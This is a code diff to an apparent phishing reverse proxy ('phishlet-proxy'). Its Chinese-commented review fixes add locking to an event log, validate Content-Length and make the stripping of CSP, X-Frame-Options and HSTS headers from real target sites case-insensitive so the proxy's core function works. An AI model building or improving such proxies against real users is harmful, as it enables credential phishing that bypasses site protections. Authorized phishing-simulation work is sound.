@@ -55,10 +55,20 @@ def save_db(db):
     json.dump(db, open(DB_FILE, 'w'), indent=1)
 
 def add_event(db, kind, uid, extra=None):
+    # R17-F1: V6b 排他锁读改写——proxy 是事件库四写入方中唯一无锁者
+    # (track V6 只修了自己侧; phishlet-proxy F36 不变性: 同库并发方
+    # 必须持同一把锁, PoC 丢 599/600)。
     ev = {'kind': kind, 'uid': uid, 'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
     if extra: ev.update(extra)
-    db['events'].append(ev)
-    save_db(db)
+    import fcntl
+    with open(DB_FILE + '.lock', 'w') as lf:
+        fcntl.flock(lf, fcntl.LOCK_EX)
+        try:
+            cur = load_db()
+            cur.setdefault('events', []).append(ev)
+            save_db(cur)
+        finally:
+            fcntl.flock(lf, fcntl.LOCK_UN)
     print(f'[proxy] {kind} uid={uid}', flush=True)
 
 class ProxyHandler(BaseHTTPRequestHandler):
@@ -96,8 +106,11 @@ class ProxyHandler(BaseHTTPRequestHandler):
     def process_response(self, status, headers, body, content_type=''):
         """Modify response: strip security headers, rewrite URLs, inject tracking"""
         # Remove security headers that prevent embedding/interaction
-        for h in ['Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security',
-                  'X-Content-Type-Options', 'Public-Key-Pins']:
+        # R17-F5: 大小写不敏感——dict(resp.headers) 保留线上原样, 真实
+        # 目标常发小写头, 字面 pop 静默未命中使核心功能失效。
+        STRIP = {'content-security-policy', 'x-frame-options', 'strict-transport-security',
+                 'x-content-type-options', 'public-key-pins'}
+        for h in [k for k in headers if k.lower() in STRIP]:
             headers.pop(h, None)
 
         # Rewrite absolute URLs pointing to target → our proxy
@@ -159,7 +172,16 @@ class ProxyHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         u = urlparse(self.path)
-        length = int(self.headers.get('Content-Length', 0))
+        # R17-F2: V3 同款校验——非数字 ValueError/负值 read(-n) 读到
+        # EOF 永久 wedge 单线程服务器/无上界读。修复只做了 track 侧。
+        try:
+            length = int(self.headers.get('Content-Length', 0) or 0)
+        except (ValueError, TypeError):
+            self.send_response(400); self.end_headers()
+            return
+        if length < 0 or length > 1_048_576:
+            self.send_response(413); self.end_headers()
+            return
         body = self.rfile.read(length) if length else b''
         body_str = body.decode('utf-8', errors='replace')
         qs = parse_qs(body_str)
